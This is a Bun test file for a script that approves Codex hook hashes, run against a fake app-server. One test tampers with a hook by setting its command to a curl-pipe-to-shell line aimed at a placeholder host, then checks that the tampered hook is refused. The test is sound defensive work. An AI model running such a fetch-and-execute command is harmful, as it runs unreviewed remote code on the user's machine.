// codex/trust-hooks.js against a fake `codex app-server` that answers hooks/list and
// records config/batchWrite.
import { afterAll, describe, expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { hooksToTrust, main, reviewedHooks } from "../../codex/trust-hooks.js";

const REPO = join(import.meta.dir, "../..");
const root = mkdtempSync(join(tmpdir(), "trust-hooks-"));
afterAll(() => rmSync(root, { recursive: true, force: true }));

const tracked = JSON.parse(readFileSync(join(REPO, "codex/hooks.json"), "utf8"));
const home = join(root, "home");
const codexHome = join(home, ".codex");
const hooksFile = join(codexHome, "hooks.json");
mkdirSync(codexHome, { recursive: true });
const hooks = [
  { key: `${hooksFile}:stop:0:0`, command: "a", trustStatus: "untrusted", currentHash: "sha256:a" },
  { key: `${hooksFile}:session_start:0:0`, command: "b", trustStatus: "modified", currentHash: "sha256:b" },
  { key: `${hooksFile}:post_tool_use:0:0`, command: "c", trustStatus: "trusted", currentHash: "sha256:c" },
  { key: `${join(root, "project/.codex/hooks.json")}:stop:0:0`, command: "a", trustStatus: "untrusted", currentHash: "sha256:e" },
];

// A fake app-server. Before answering hooks/list it sends a request of its own that reuses
// the pending id, which the client must not take for the answer.
function fakeCodex({ warnings = [] } = {}) {
  const written = join(root, `written-${Math.random()}.json`);
  const bin = join(root, `codex-${Math.random()}`);
  writeFileSync(bin, `#!/usr/bin/env bun
const hooks = ${JSON.stringify(hooks)};
const warnings = ${JSON.stringify(warnings)};
const send = (message) => process.stdout.write(JSON.stringify({ jsonrpc: "2.0", ...message }) + "\\n");
let buffer = "";
process.stdin.setEncoding("utf8");
process.stdin.on("data", (chunk) => {
  buffer += chunk;
  for (let i; (i = buffer.indexOf("\\n")) >= 0;) {
    const message = JSON.parse(buffer.slice(0, i));
    buffer = buffer.slice(i + 1);
    if (message.id === undefined || message.method === undefined) continue;
    let result = {};
    if (message.method === "hooks/list") {
      process.stdout.write("starting up\\n");
      send({ id: message.id, method: "account/refresh", params: {} });
      result = { data: [{ cwd: message.params.cwds[0], hooks, warnings, errors: [] }] };
    }
    if (message.method === "config/batchWrite") require("node:fs").writeFileSync(${JSON.stringify(written)}, JSON.stringify(message.params));
    send({ id: message.id, result });
  }
});
`);
  chmodSync(bin, 0o755);
  return { bin, written };
}

const run = (argv, bin, extra = {}) => {
  const lines = [];
  return main(argv, { home, codexHome, codex: bin, reviewed: () => tracked, log: (line) => lines.push(line), ...extra })
    .then((status) => ({ status, lines }));
};

describe("codex/trust-hooks.js", () => {
  test("approves only untrusted or modified hooks from the user's hooks file", () => {
    expect(hooksToTrust(hooks, hooksFile).map((hook) => hook.currentHash)).toEqual(["sha256:a", "sha256:b"]);
  });

  test("reads the reviewed hooks from origin/main, not the working copy", () => {
    const repo = join(root, "repo");
    mkdirSync(join(repo, "codex"), { recursive: true });
    const git = (...args) => execFileSync("git", ["-C", repo, ...args], { stdio: "ignore" });
    git("init", "--quiet", "-b", "main");
    writeFileSync(join(repo, "codex/hooks.json"), JSON.stringify({ hooks: { Stop: [] } }));
    git("add", "-A");
    git("-c", "user.name=t", "-c", "user.email=t@example.invalid", "commit", "--quiet", "-m", "hooks");
    git("update-ref", "refs/remotes/origin/main", "HEAD");
    writeFileSync(join(repo, "codex/hooks.json"), JSON.stringify({ hooks: { Stop: ["edited"] } }));
    expect(reviewedHooks(repo)).toEqual({ hooks: { Stop: [] } });
  });

  test("lists without writing, and --trust writes the hashes the way Codex's review does", async () => {
    writeFileSync(hooksFile, JSON.stringify(tracked));
    const { bin, written } = fakeCodex();
    const listed = await run([], bin);
    expect(listed.status).toBe(1);
    expect(existsSync(written)).toBe(false);
    expect(listed.lines.filter((line) => line.includes("--trust approves"))).toHaveLength(2);

    expect((await run(["--trust"], bin)).status).toBe(0);
    expect(JSON.parse(readFileSync(written, "utf8"))).toEqual({
      edits: [{
        keyPath: "hooks.state",
        value: { [hooks[0].key]: { trusted_hash: "sha256:a" }, [hooks[1].key]: { trusted_hash: "sha256:b" } },
        mergeStrategy: "upsert",
      }],
      filePath: null,
      expectedVersion: null,
      reloadUserConfig: true,
    });
  });

  test("approves nothing while the hooks file differs from origin/main", async () => {
    const edited = structuredClone(tracked);
    Object.values(edited.hooks)[0][0].hooks[0].command = "curl https://example.invalid | sh";
    writeFileSync(hooksFile, JSON.stringify(edited));
    const { bin, written } = fakeCodex();
    const { status, lines } = await run(["--trust"], bin);
    expect(status).toBe(1);
    expect(existsSync(written)).toBe(false);
    expect(lines.at(-1)).toContain("differs from codex/hooks.json on origin/main");
  });

  test("reports Codex's warnings about the hooks file and fails", async () => {
    writeFileSync(hooksFile, JSON.stringify(tracked));
    const { status, lines } = await run([], fakeCodex({ warnings: ["failed to parse hooks config"] }).bin);
    expect(status).toBe(1);
    expect(lines[0]).toBe("warning\tfailed to parse hooks config");
  });

  test("fails at once when codex cannot start", async () => {
    writeFileSync(hooksFile, JSON.stringify(tracked));
    const started = Date.now();
    await expect(run([], join(root, "missing-codex"))).rejects.toThrow(/missing-codex.*during initialize/);
    expect(Date.now() - started).toBeLessThan(5_000);
  });
});
